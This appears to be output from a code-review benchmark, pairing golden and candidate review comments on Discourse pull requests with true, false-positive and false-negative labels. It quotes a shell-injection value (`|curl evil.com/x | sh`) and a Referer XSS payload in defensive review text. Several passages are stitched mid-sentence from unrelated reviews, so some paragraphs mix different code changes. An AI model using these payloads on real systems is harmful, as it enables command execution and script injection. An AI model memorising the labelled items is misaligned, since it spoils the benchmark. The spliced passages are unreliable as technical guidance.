`ensure_loaded!` lazily initialises the shared `@loaded_locales` array outside the `LOAD_MUTEX` that `load_locale` uses. Two threads calling `ensure_loaded!` concurrently on a fresh process can each create a separate array; one of them is then discarded together with the locales it recorded, so locales get re-loaded (and the `@loaded_locales.include?` fast path in `translate` can be defeated) under load. Initialise the array inside the mutex (or at module load time) to keep the bookkeeping consistent.
true_positives.reasoning: Both identify unsynchronized lazy initialization and concurrent access to @loaded_locales. The candidate specifically highlights initialization outside LOAD_MUTEX and the resulting race, matching the golden concern.

false_positives.candidate:
Fallback locales are never loaded outside of HTTP requests, so fallbacks silently fail in jobs/mailers

The translate accelerator only loads the YAML for `config.locale` (`load_locale(config.locale)` in `translate`), and the patched `I18n::Backend::Base#load_translations` deliberately does nothing when called without filenames, so `Simple#init_translations` will not autoload anything either. With `I18n::Backend::Fallbacks` now mixed in, a lookup that misses falls back to `SiteSetting.default_locale` and `:en`, but those locales' translations are only in memory if something explicitly called `I18n.ensure_loaded!` for them. The only caller added in this PR is `ApplicationController#set_locale`. Any translation performed outside a controller request — Sidekiq jobs (e.g. digest/notification emails rendered with the recipient's locale via `I18n.with_locale`), rake tasks, console, console-driven exports — will therefore still produce “translation missing” for keys absent from the user's locale, which is exactly the case fallbacks are supposed to fix. The ensure-loaded logic should be hooked into `load_locale`/`translate` (or into `I18n.locale=`) rather than into a single before_filter.

Every request depends on I18n.fallbacks being the custom FallbackLocaleList

`I18n.fallbacks.ensure_loaded!` assumes `I18n.fallbacks` is the `FallbackLocaleList` defined in `config/initializers/i18n.rb`. `ensure_loaded!` does not exist on the stock `I18n::Locale::Fallbacks`. Rails' I18n railtie configures fallbacks from `config.i18n.fallbacks` inside `config.after_initialize`, i.e. *after* `config/initializers/*` have run, and assigns `I18n.fallbacks = I18n::Locale::Fallbacks.new(...)`. This PR removed `config.i18n.fallbacks = true` from production/profile/cloud66 only; if it is still set in any other environment file (development/test) or by any plugin/host config, the custom list is replaced at boot and then *every* request raises `NoMethodError: undefined method 'ensure_loaded!'` in a before_filter — a complete outage. Either guard the call (`respond_to?`) or install the fallback list from an `after_initialize`/railtie hook that runs after Rails' own i18n setup.

`SiteSetting.default_locale.to_sym` can raise and `.compact` cannot protect against it

`[locale, SiteSetting.default_locale.to_sym, :en].uniq.compact` calls `to_sym` on the site setting before the array is built, so a nil/blank `default_locale` raises `NoMethodError` instead of being removed by `compact` (`compact` after `uniq` only removes a nil `locale`). More importantly, this method is invoked by `I18n::Backend::Fallbacks` on every missed translation, including during boot, migrations and `rake assets:precompile`, where `SiteSetting` may be unavailable (no DB / missing table) — turning a harmless missing-translation lookup into an exception. Resolve the default locale defensively (e.g. `SiteSetting.default_locale.presence&.to_sym` inside a rescue) and build the list as `[locale, default, :en].compact.uniq`.

LRU translation cache key ignores the fallback chain (stale strings after default_locale change)

The cache key is `"#{key}#{config.locale}#{config.backend.object_id}"`. Now that a lookup result can come from `SiteSetting.default_locale` via the new fallback chain, the cached value depends on the site default locale, which is not part of the key and does not change the backend object. After an admin changes `default_locale`, every already-cached fallback translation for other locales keeps serving strings from the old default locale until the process is restarted or `I18n.reload!` is called. Include the fallback chain (or the default locale) in the cache key, or clear the LRU cache when `default_locale` changes.

No tests for the new fallback behaviour

This PR changes how every translation is resolved (custom fallback chain, on-demand loading of fallback locales, removal of `config.i18n.fallbacks`) but adds no specs. There is nothing verifying that (a) the fallback order is user locale → `SiteSetting.default_locale` → `:en`, (b) `FallbackLocaleList#ensure_loaded!` actually loads the fallback locales' YAML so a key missing from the user locale resolves instead of returning “translation missing”, and (c) the chain is recomputed when `SiteSetting.default_locale` changes. Regressions here degrade silently into missing-translation strings, so at minimum a spec exercising a key present only in `en` while `I18n.locale` is a partial locale is needed.

Unlike the singular branch (which keeps the `_id` key when hydration fails), this destroys the original ids: if the sub-collection is not side-loaded in the payload, the model ends up with an array of `undefined` values and the `*_ids` property is gone, so callers can neither use the objects nor fall back to the ids. `create_table :embeddable_hosts, force: true` issues a `DROP TABLE IF EXISTS` first. Consequences: the cached `groups.user_count` column (exposed by `BasicGroupSerializer` and used by the admin group list and group index) is never decremented and drifts permanently, and any `GroupUser` destroy-time bookkeeping (e.g. clearing `primary_group`/badge title that was granted by the group) is skipped. The removal should go through the model API that destroys the join record, e.g. `group.remove(user)` or `group.group_users.where(user_id: user_id).destroy_all`. Additionally, passing an id that is not a member makes the association call `find(id)` and raise `ActiveRecord::RecordNotFound`, turning a no-op removal into a 404 instead of a clean response.

A group created with a non-default alias level in the admin UI is silently saved with the default level, and the UI then shows the value the admin picked, so the discrepancy is invisible until a page reload. `update` does assign `alias_level`; `create` should do the same. Note also that this change switches the create/update payload from nested `group[...]` params to flat params and drops support for `usernames`, which breaks any existing API client of `POST/PUT /admin/groups`.

The `update_patch` branch (incremental `changes: {add:, delete:}` membership edits) was deleted, but `resources :groups` still routes PATCH to `update`. A client still issuing `PATCH /admin/groups/:id` with `changes` now gets HTTP 200 while the membership changes are silently discarded, and because `update` unconditionally executes `group.visible = params[:visible] == "true"`, the absent `visible` param flips the group to not visible. Old callers therefore both lose their intended effect and mutate unrelated state while being told everything succeeded. Either keep handling `changes` (or reject PATCH explicitly) and only assign `visible` when the param is present.

members endpoint does not validate limit/offset

`limit = (params[:limit] || 50).to_i` and `offset = params[:offset].to_i` are passed straight to `.limit()/.offset()`. A request with `?offset=-1` or `?limit=-1` produces `OFFSET -1` / `LIMIT -1`, which PostgreSQL rejects (`ERROR: OFFSET must not be negative`), turning a bad query string into a 500. There is also no upper bound on `limit`, so `?limit=1000000` on a large automatic group (e.g. trust_level_0) will serialize every member in one unauthenticated-reachable request, an easy way to burn server CPU/memory. If the break is intentional it should at least be called out in the PR description/changelog; otherwise consider keeping the array for non-paginated requests.

If the server responds 422 (e.g. `can_not_modify_automatic`) or 404/500 (see the RecordNotFound path in `Admin::GroupsController#remove_member`), the promise rejects silently: the member list is not refreshed and the admin gets no indication the operation failed. false_positives.candidate:
`float: right` on .small-action button is inert now that .small-action is a flex container

`.small-action` now gets `@include flexbox()` (display:flex), which makes float declarations on its direct children no-ops. The `button` child still relies on `float: right` to be pushed to the right edge of the small-action row (e.g. the undo/delete control). With flex layout the button becomes a normal flex item sized to its content and will sit immediately after `.small-action-desc` instead of at the right edge of the row. To keep the previous layout the button needs `margin-left: auto` (or the description needs `flex: 1`). The same applies to `float: left` on `.topic-avatar` (line 270), which is now dead code.

Removing vertical padding from .small-action-desc can let the floated avatar overflow

`.small-action-desc` changed from `padding: 0.5em 0 0.5em 4em; margin-top: 5px` to `padding: 0 1.5%`, but `.small-action-desc .avatar` (line 298) is still floated. A float does not contribute to the height of its block container, so with zero vertical padding the flex item's height is only the text line height; if the avatar is taller than one line of the 0.9em text it will overflow the flex item and overlap neighbouring content. Previously the 0.5em padding plus 5px margin absorbed the difference. Consider clearing the float or using flex/inline-block for the avatar instead.

.panel loses right alignment on the legacy box model the flexbox mixin targets

`.panel` replaced `float: right` with `margin-left: auto` + `order(3)`. `margin-left: auto` only pushes a flex item to the end in the modern flexbox spec; the `flexbox()` mixin deliberately also emits `display: -webkit-box` and `display: -moz-box` for old WebKit/Gecko, where auto margins are not honoured in the box model. In those browsers the header panel (notification/search/user icons) will now render left-aligned right after the title instead of at the right edge. Either drop the legacy `display` fallbacks or add `-webkit-box-pack: end` / `-ms-flex-pack: end` on `.contents`.

inline-flex mixin forces legacy box layout where a safe inline-block fallback existed

`.badge-wrapper.bullet` previously declared only `display: inline-flex`, so browsers without flexbox support simply kept `display: inline-block` from the `.badge-wrapper` rule and rendered correctly. The new `inline-flex()` mixin additionally emits `display: -webkit-inline-box` / `-moz-inline-box` / `-ms-inline-flexbox`, which those same old browsers *do* understand, switching the bullet badges to the legacy box model with different sizing/shrinking rules (relevant here because `span.badge-category` relies on `max-width`, `overflow: hidden` and `text-overflow: ellipsis`). This is a rendering change for old browsers that was previously handled gracefully; verify it or drop the legacy display fallbacks.

false_negatives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
include_website_name is missing the trailing '?' so the inclusion guard is dead code

ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method defined here is `include_website_name` (no question mark), so it is never called and `website_name` is always emitted — including as `null` for every user without a website. Rename it to `include_website_name?` (and note that its body should also honour `scope.restrict_user_fields?`, see the untrusted-attributes issue).
true_positives.reasoning: The candidate identifies the same primary issue: include_website_name lacks the required '?' suffix, preventing the serializer's conditional inclusion guard from being used. It does not mention the golden comment's additional string-literal mutation concern, but clearly matches the inclusion predicate bug.

false_positives.candidate:
website_name is not listed in untrusted_attributes, leaking TL0 users' website to anonymous visitors

`:website` is included in `untrusted_attributes` (line 105-111) so that a trust-level-0 user's website is hidden from anonymous viewers (anti-spam/SEO measure). The new `:website_name` attribute is added to the plain `attributes` list only, so it is always serialized and now exposes the host (and, for same-domain sites, the full path) of a TL0 user's website to anonymous requests. The front-end template renders `model.website_name` unconditionally, so the previously suppressed information becomes visible again. `:website_name` should be added to `untrusted_attributes` (and the TL0 spec list updated).

`"." << website_host` mutates a string literal

`discourse_host.ends_with?("." << website_host)` uses destructive append on a string literal. It works today only because literals are unfrozen; under `# frozen_string_literal: true` (or if the file is ever frozen-string-literal enabled) this raises `FrozenError` at runtime for every profile serialization. Use `".#{website_host}"` or `"." + website_host`.

Sibling-subdomain comparison yields false positives on shared public suffixes

The branch that strips the first label (`www.example.com` vs `forum.example.com`) compares only the remaining labels, so unrelated sites that merely share a public suffix of the same label count are treated as the same domain — e.g. instance `forum.github.io` and user website `someone.github.io`, or any pair under a 3-label suffix. The result is that the full URL path of an unrelated third-party site is rendered as the link text. Consider restricting this to a registrable-domain comparison (e.g. PublicSuffix) or at least matching only when one host is a suffix of the other.

Only URI path is appended; query/fragment are dropped and host matching is case sensitive

`website_name` builds the display text from `host + path`, so for `http://example.com/u?tab=1#x` on a same-domain instance it renders `example.com/u`, silently hiding the part of the URL the feature is meant to disclose. Additionally `URI#host` preserves the case as typed, so `http://Example.com` never equals `Discourse.current_hostname` (`example.com`) and falls into the generic branch. Downcase the host before comparing and include query/fragment (or use `URI#request_uri`) if the goal is to show the complete URL.

TL0/anonymous spec does not assert website_name is withheld

The `untrusted_attributes` list in the "TL0 user seen as anonymous" context was not updated with `website_name`, so the new attribute's exposure to anonymous viewers is untested and the regression described above passes CI. Add `website_name` to that list (after fixing the serializer) so the privacy guard is covered.

Missing cases for sibling-subdomain branch and blank/invalid website

The new specs cover only equal hosts, unrelated hosts, and website-domain-is-parent-of-instance. There is no coverage for the sibling-subdomain branch the code explicitly implements (e.g. instance `forum.example.com`, website `http://www.example.com/user`), for the reverse case (instance `example.com`, website `www.example.com`), or for a blank/unparseable website (which must return nil without raising and ideally omit the key). These are the branches most likely to break.

true_positives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
true_positives.matched_candidate:
postMessage origin check uses substring matching instead of comparing origins

`if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `event.origin` that happens to be a substring of the configured `discourseUrl` (and would silently accept everything if `discourseUrl` were ever empty). Derive the expected origin from `discourseUrl` (scheme + host + optional port) and compare it with `e.origin` for strict equality, so only the forum frame can resize the iframe.
true_positives.reasoning: Both identify the same security flaw: indexOf-based substring matching is insufficient for postMessage origin validation and can accept unintended origins. The candidate proposes strict origin equality, addressing the underlying issue despite differences in the bypass example.

true_positives.golden_comment: The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.
true_positives.matched_candidate:
`<%- end if %>` produces a stray modifier-if that breaks the header block

Line 6 emits the Ruby code `end if` instead of `end`. The compiled template therefore becomes `if ... else ... end if <next generated statement>`, i.e. the whole if/else expression turns into a modifier-if whose condition is the following generated line (the logo `link_to` append). Depending on the ERB compiler this either raises a syntax error when the template is compiled (500 on every embed request) or silently reorders the output so the logo is appended before the button. Change it to `<%- end %>`.
true_positives.reasoning: Both identify the erroneous ERB closing tag `end if` and recommend replacing it with `end`. The candidate adds speculative behavior, but it identifies the same underlying bug.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
`i.content` is nil for RSS 2.0 feeds, raising NoMethodError and killing the job

`content = CGI.unescapeHTML(i.content.scrub)` assumes every feed item exposes a `content` field. SimpleRSS returns nil for keys that are absent, and RSS 2.0 items carry the body in `description` (Atom uses `content`/`summary`). For a plain RSS feed this raises `NoMethodError: undefined method 'scrub' for nil`. Because the job is declared `sidekiq_options retry: false`, the whole hourly poll aborts on the first such item and nothing is imported, with no fallback. Fall back to `i.description`/`i.summary` and skip items with blank content.
true_positives.reasoning: Both identify the same bug: calling scrub on a potentially nil i.content crashes processing when feeds omit content, and both recommend falling back to description.

true_positives.golden_comment: An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.
true_positives.matched_candidate:
Unescaped request.referer interpolated into inline JavaScript (XSS)

The embed layout writes `parent.postMessage({...}, '<%= request.referer %>')`, injecting the raw `Referer` request header into a single-quoted JS string literal with no escaping (no `j`/`escape_javascript`, and ERB's HTML escaping does not help inside a JS string). The only validation performed is `EmbedController#ensure_embeddable`, which checks the *host* of the referer; the path, query and fragment are free-form and may legally contain `'`, so an attacker who can get a victim to load `embed/best` with a crafted Referer (e.g. `http://<embeddable_host>/#'+alert(document.cookie)+'`) gets script execution in the forum's origin. Escape with `escape_javascript` (or, better, compute and emit only the scheme+host origin).
true_positives.reasoning: Both identify the same XSS vulnerability: request.referer is interpolated into JavaScript without proper JavaScript escaping, potentially allowing attacker-controlled header content to execute arbitrary scripts.

false_positives.candidate:
Feed HTML stored as raw_html and rendered unescaped (stored XSS)

Feed item bodies are run through `CGI.unescapeHTML` (turning `<script>` back into real tags) and handed to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` then returns `raw` verbatim (app/models/post.rb:133) and the embed view renders it with `<%= raw post.cooked %>` (app/views/embed/best.html.erb:19), as does the normal topic view. No sanitization step exists anywhere in this path, so any script/iframe/onerror payload in a polled RSS/Atom feed (or in a compromised/hijacked feed URL) becomes stored XSS for every forum visitor. The raw HTML should be sanitized (e.g. via `Sanitize`/the existing allowed-tag whitelist) before being stored as `raw_html`.

Kernel#open on a site-setting URL allows command execution and has no timeouts

`SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses `Kernel#open` with open-uri semantics: a value beginning with `|` (e.g. `|curl evil.com/x | sh`) is executed as a shell command, so an admin-editable (and, in multisite setups, potentially less-trusted) site setting becomes remote command execution in the Sidekiq process. There is also no read/open timeout or size limit, so a slow or huge feed can hang the worker indefinitely. Validate the scheme (http/https only) and fetch with `URI.parse(...).open` / a real HTTP client with timeouts.

Anonymous requests can trigger unbounded remote fetches and topic creation for arbitrary URLs

`best` enqueues `Jobs::RetrieveTopic` for any `embed_url` whose host matches `embeddable_host`, with no authentication required. `TopicRetriever` only throttles per exact URL (60s), so a client can iterate over arbitrary paths/query strings on the embeddable host (`?x=1`, `?x=2`, ...) and cause the forum to (a) create an unbounded number of redis throttle keys, (b) issue an unbounded number of outbound HTTP fetches, and (c) create a new topic/post per distinct URL, including for 404/garbage pages. A global rate limit (per IP and/or per site) and a check that the retrieved page is a real article are needed.

`post.present?` does not mean the post was saved; can violate NOT NULL on topic_embeds

`PostCreator#create` returns the (possibly unsaved) `@post` object even when validation fails — `save_post` raises `ActiveRecord::Rollback`, which inside this nested `Topic.transaction` block is swallowed rather than rolling back. `post.present?` is therefore true for an unsaved record, and `TopicEmbed.create!(topic_id: post.topic_id, post_id: post.id, ...)` runs with nil ids, violating the `null: false` constraints added in 20131217174004 and raising a StatementInvalid out of the job. Check `post.try(:persisted?)` / `creator.errors.blank?` instead.

New embed assets are not added to the asset precompile list

The layout references `stylesheet_link_tag 'embed'` and the new `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither asset is added to `config.assets.precompile` (no change to config/application.rb or an initializer in this PR). Discourse precompiles an explicit whitelist, so in production `embed.css` / `embed.js` will not exist and every `embed/best` request will raise `Sprockets::Rails::Helper::AssetNotPrecompiled` / 500. Add both files to the precompile list.

`force: true` added to an already-committed migration can drop a populated table

This migration existed before the PR and has already run on deployed installs; adding `force: true` has no effect there, but it makes the migration destructive if it is ever re-run (e.g. after a `rake db:migrate:redo`, a rollback/re-apply, or a schema reload), because `create_table ... force: true` issues a `DROP TABLE top_topics` first and silently discards the existing rows. The same pattern is used for the new `topic_embeds` table (db/migrate/20131217174004_create_topic_embeds.rb:3). `force: true` should not be used in migrations.

import mutates the caller's `contents` string

`contents << "\n<hr>..."` appends the attribution footer in place, so the caller's string object is modified as a side effect (e.g. the `content` local in PollFeed, or anything a plugin/thor task passes in). If a frozen or shared string is passed the call raises `RuntimeError: can't modify frozen String`, and repeated calls with the same object accumulate footers. Use `contents = contents + "..."` / `+=`.

absolutize_urls mangles protocol-relative URLs and ignores path-relative ones

The check `href.start_with?('/')` also matches protocol-relative URLs such as `//cdn.example.com/x.png`; `sub(/^\/+/, '')` then strips both slashes producing `http://feedhost/cdn.example.com/x.png`, i.e. a broken link/image for every protocol-relative asset in a feed (very common for CDN-hosted images). Conversely, truly relative references (`images/x.png`, `../x`) are left untouched and will resolve against the Discourse host. Resolving with `URI.join(url, href)` handles all of these cases correctly.

setnx followed by a separate expire can leave a permanent throttle key

`$redis.setnx(key, "1")` and `$redis.expire(key, 60)` are two round trips; if the process dies (or redis fails) between them, the key is left with no TTL and `retrieved_recently?` returns true forever, permanently blocking retrieval of that embed URL for non-staff users. Use a single atomic `SET key 1 NX EX 60`.

Negative PollFeed specs pass vacuously

`feed_polling_enabled` defaults to false (config/site_settings.yml), so the "requires feed_polling_url" and "requires embed_by_username" examples would pass even if those two conditions were removed from `execute` — the first condition already short-circuits. Each example should stub the other settings to valid values so that only the condition under test is false. Note also that `poll_feed` itself (feed parsing, url fallback, content handling) has no test coverage at all.

"is 404 without an embed_url" does not exercise the missing-parameter path

`embeddable_host` defaults to `''`, so `ensure_embeddable` raises `Discourse::InvalidAccess` before the action (and thus before `params.require(:embed_url)`) ever runs. The example passes for the wrong reason and gives no coverage of the missing-parameter behaviour; it also asserts only `should_not be_success` rather than the claimed 404. Stub `embeddable_host` and a matching referer, then assert the actual status returned for a missing `embed_url`.

import_remote calls open() without requiring open-uri

`open(url).read` relies on open-uri being loaded, but topic_embed.rb only requires nokogiri; the `require 'open-uri'` lives in app/jobs/scheduled/poll_feed.rb. When `import_remote` is reached via `Jobs::RetrieveTopic` -> `TopicRetriever` (neither of which loads poll_feed or open-uri), `open` is plain `Kernel#open` and an http URL fails with `Errno::ENOENT`. Add `require 'open-uri'` to this file (and prefer `URI.parse(url).open` so a `|command` string can never be executed).

Only the Rails 4 lockfile was regenerated for the new gems

`ruby-readability` and `simple-rss` are added unconditionally to the Gemfile, but only `Gemfile_rails4.lock` is updated. The Gemfile explicitly supports dual-booting (RAILS3 / RAILS_MASTER) with separate lockfiles, so booting in those modes will hit an out-of-sync lockfile and require a `bundle install` (or fail in deployment/frozen mode). Regenerate the other lockfiles as part of this change.

false_negatives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.

true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:
Second `self.downsize` definition silently overwrites the 4-argument one

`self.downsize(from, to, max_width, max_height, opts={})` (line 145) is immediately redefined by `self.downsize(from, to, dimensions, opts={})` (line 149). In Ruby the later definition wins, so the 4-arg form is dead code and every existing caller that passes width and height separately (e.g. `OptimizedImage.downsize(path, path, w, h)`) now either raises `ArgumentError` (5 args) or passes the height Integer as `opts`, which then blows up with `TypeError: no implicit conversion of Symbol into Integer` inside `downsize_instructions` when evaluating `opts[:force_aspect_ratio]`. If both forms are needed, use a single method that accepts either a dimension string or width/height, and update all call sites.
true_positives.reasoning: Both identify the duplicate downsize definition: the later dimensions-string signature overrides the earlier width/height signature, making it unreachable and breaking callers that pass separate width and height arguments.

true_positives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).
true_positives.matched_candidate:
Client-side size limit hardcoded to 10MB, ignoring max_attachment_size_kb / max_image_size_kb

`validateUploadedFile` previously used `Discourse.SiteSettings['max_' + type + '_size_kb']`; it now hardcodes 10240 KB for every type. Non-image attachments are not downsized server-side, so a site configured with a smaller `max_attachment_size_kb` will let users pick files that the server then rejects (and the `file_too_large` alert quotes 10240 KB, a number the admin never configured). Conversely, sites with a larger configured limit now have uploads blocked in the browser. The `type` argument is also no longer used for the size check. Keep using the site setting for attachments, and only bypass it for images that the server will downsize.
true_positives.reasoning: Both identify the hardcoded 10MB client-side upload limit replacing per-type Discourse site settings, causing client/server limit mismatches. The candidate omits the 413 handler but clearly identifies the same underlying issue.

true_positives.golden_comment: Passing 80% as the dimensions can fail for animated GIFs when allow_animated_thumbnails is true, since the animated path uses gifsicle --resize-fit which expects WxH geometry, not a percentage; downsizing would then silently fail.
true_positives.matched_candidate:
Percentage dimension is invalid for the animated-GIF (gifsicle) code path

With `SiteSetting.allow_animated_thumbnails` enabled and a `.gif` upload, `optimize` dispatches to `downsize_instructions_animated`, which builds `gifsicle <from> --colors=256 --resize-fit 80% --optimize=3 --output <to>`. `--resize-fit` only accepts pixel geometry (`WxH`, `_xH`, ...), not a percentage, so gifsicle exits with an error; because input and output are the same path the GIF may also be clobbered. Use `--scale 0.8` for gifsicle, or compute explicit pixel dimensions before calling downsize.
true_positives.reasoning: Both identify the same bug: when animated thumbnails are enabled, passing 80% to gifsicle --resize-fit is invalid because it expects pixel geometry, causing animated GIF downsizing to fail. The candidate's additional clobbering concern does not change the underlying match.

true_positives.golden_comment: The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.
true_positives.matched_candidate:
Loop re-reads size from a Tempfile handle whose file was rewritten by an external process

The loop condition and the later `Upload.create_for(..., tempfile.size, ...)` read size through the still-open `Tempfile` object after an external binary rewrote `tempfile.path`. If the tool writes a new file and renames it over the path (gifsicle does this, and some ImageMagick delegates do too), the open descriptor still refers to the unlinked original inode, so `tempfile.size` returns the stale (large) size: the loop keeps re-converting for all 5 attempts and the recorded filesize can disagree with the stored bytes. Re-open/stat the path (`File.size(tempfile.path)`) after each conversion instead of trusting the cached handle.
true_positives.reasoning: Both identify stale size readings from tempfile.size after file modifications, causing incorrect loop behavior and potentially incorrect file handling. The candidate adds a specific external-rewrite mechanism and bounded retry detail, but addresses the same underlying issue.

false_positives.candidate:
In-place downsize can destroy the uploaded file and the failure result is ignored

`OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` uses the same path for input and output, so ImageMagick/gifsicle truncates and rewrites the only copy of the user's upload. `convert_with` swallows errors (`rescue` -> `false`) and this return value is not checked, so a failed or partially written conversion leaves a truncated/empty file that is then handed to `Upload.create_for`, producing a corrupt upload instead of an error. Write to a separate temp file and only swap it in when the conversion reports success; abort the loop as soon as `downsize` returns false.

413 error message hardcodes 10MB instead of the configured limit

In `displayErrorForUpload`, the HTTP 413 branch now reports `10 * 1024` KB regardless of the site's `max_image_size_kb`/`max_attachment_size_kb` or the web server's `client_max_body_size`. Users on sites with a different limit get a misleading maximum size in the alert.

API URL download limit hardcoded to 10MB for all upload types

`FileHelper.download(url, 10.megabytes, ...)` replaces the `SiteSetting.max_image_size_kb`-derived limit. This applies to every `type`, including attachments which are never downsized afterwards, so an API user can make the server fetch and buffer up to 10MB per request even when the administrator configured a much smaller maximum. Derive the cap from the relevant site setting (with an explicit, bounded allowance for images that will be downsized).

Up to five full ImageMagick + ImageOptim passes run inline per upload

Each loop iteration shells out to `convert` and then `ImageOptim.new.optimize_image!` (inside `convert_with`), so a single large upload can trigger five full re-encodes plus five lossless-optimizer runs while occupying a request/Defer worker. For multi-megabyte images this is seconds to minutes of CPU per upload and is trivially triggerable by any logged-in user. Compute the target scale from the current/desired byte ratio so one or two passes suffice, and skip the ImageOptim pass for intermediate iterations.

No tests for the new auto-downsize behaviour or the changed downsize signature

The PR adds a size-reduction loop in `create_upload` and changes `OptimizedImage.downsize`/`optimize` signatures, but no specs are added or updated. There is no coverage for: an oversized image being reduced below `max_image_size_kb`, an image still too large after 5 attempts, a non-image skipping the loop, or the new `downsize(from, to, dimensions)` form. Existing specs calling `OptimizedImage.downsize(from, to, w, h)` or `OptimizedImage.dimensions` (now removed) would also fail silently unnoticed without updates.

true_positives.golden_comment: logic: Potential nil pointer exception - if no TopicUser record exists, tu will be nil and calling methods on it will crash
true_positives.matched_candidate:
unsubscribe crashes with NoMethodError when no TopicUser row exists

`TopicsController#unsubscribe` does `tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` and then immediately dereferences `tu.notification_level` without a nil check. A `topic_users` row is not guaranteed to exist for the current user and topic (e.g. the link is shared/forwarded and opened by a different logged-in user, the row was removed, or the user simply visits `/t/<slug>/<id>/unsubscribe` for a topic they have never interacted with). In those cases the request raises `NoMethodError` on nil and returns a 500 instead of a useful page. The action should create/fetch the record (e.g. via `TopicUser.change`) or handle nil gracefully.
true_positives.reasoning: Both identify the same nil dereference: when no TopicUser record exists, tu is nil and accessing its notification_level raises an exception.

true_positives.golden_comment: Typo in property name: 'stopNotificiationsText' should be 'stopNotificationsText' (missing 'n' in 'Notifications')
true_positives.matched_candidate:
Misspelled property name stopNotificiationsText

The computed property is named `stopNotificiationsText` ("Notificiations") in both the controller and `templates/topic/unsubscribe.hbs`. It works today because the typo is consistent, but it is a trap for future edits/overrides (a correctly spelled reference in a plugin or theme will silently render nothing). Rename to `stopNotificationsText` in both places.
true_positives.reasoning: Both identify the misspelled property 'stopNotificiationsText' and recommend renaming it to 'stopNotificationsText'.

false_positives.candidate: State-changing unsubscribe exposed over GET with no CSRF protection The new `unsubscribe` action mutates the user's `topic_users.notification_level` and is wired to GET routes (`get "t/:slug/:topic_id/unsubscribe"`, `get "t/:topic_id/unsubscribe"`) with `skip_before_filter :check_xhr`. Rails does not CSRF-protect GET requests, so any third-party page can silently change a logged-in user's notification level for an arbitrary topic with ``, and repeated loads will escalate the level to `muted` (see the toggle logic). Browser prefetching/link scanners and a plain page refresh have the same effect. Side effects should be performed behind a POST/PUT (or a signed unsubscribe key, like `email/unsubscribe/:key`) rather than a plain GET.

Writing notification_level directly bypasses TopicUser.change bookkeeping

The action assigns `tu.notification_level` and calls `tu.save!` instead of going through `TopicUser.change`. As a result `notifications_reason_id` and `notifications_changed_at` are never set, and no MessageBus `/topic/<id>` `notification_level_change` message is published. Two concrete consequences: (1) other open tabs/clients keep showing the stale notification level; (2) `TopicUser.update_last_read` only auto-bumps the level to `tracking` when `notifications_reason_id IS NULL`, so after this unsubscribe the next time the user reads the topic long enough their level is silently raised back to `tracking`, undoing the unsubscribe.

Unsubscribe is not idempotent: reloading the page escalates to muted

The logic is `if tu.notification_level > regular then regular else muted`. A watching/tracking user who opens the unsubscribe link gets `regular`; if the same URL is hit again (page refresh, back/forward navigation, browser or mail-client prefetch, or the user clicking the link in a second email) the level is now equal to `regular`, so the else branch sets `muted`. A single user action ("unsubscribe from this topic") can therefore silently escalate to full muting of the topic without any further confirmation. The endpoint should be idempotent, i.e. set a single deterministic target level.

Unsubscribe page claims notifications will stop even when level is only lowered to 'regular' The page always renders `topic.unsubscribe.stop_notifications` ("You will stop receiving notifications for {{title}}."), but the server only sets the level to `regular` when the user was watching/tracking. At `regular` the user still receives notifications for replies to their posts, quotes and mentions in that topic, so the message is factually wrong for the most common case. The same applies to the new `unsubscribe_link` server string ("To stop receiving notifications about this particular topic, click here"). The text should reflect the level that was actually applied.

unsubscribe_link translation now requires %{unsubscribe_url} with no fallback

The `unsubscribe_link` string gained a `%{unsubscribe_url}` interpolation, but `Email::MessageBuilder` adds no default for `unsubscribe_url` in `@template_args`. Any caller that passes `add_unsubscribe_link: true` without also passing `unsubscribe_url` (other mailers, forks, plugins) will now raise `I18n::MissingInterpolationArgument` in `MessageBuilder#body`/`#html_part`, i.e. the email fails to send. The fact that `spec/components/email/message_builder_spec.rb` had to be changed to add `unsubscribe_url` confirms the hard dependency. Add a default (e.g. fall back to `user_preferences_url`) or only append the per-topic sentence when the option is present.

No tests for the new unsubscribe endpoint or unsubscribe_url rendering

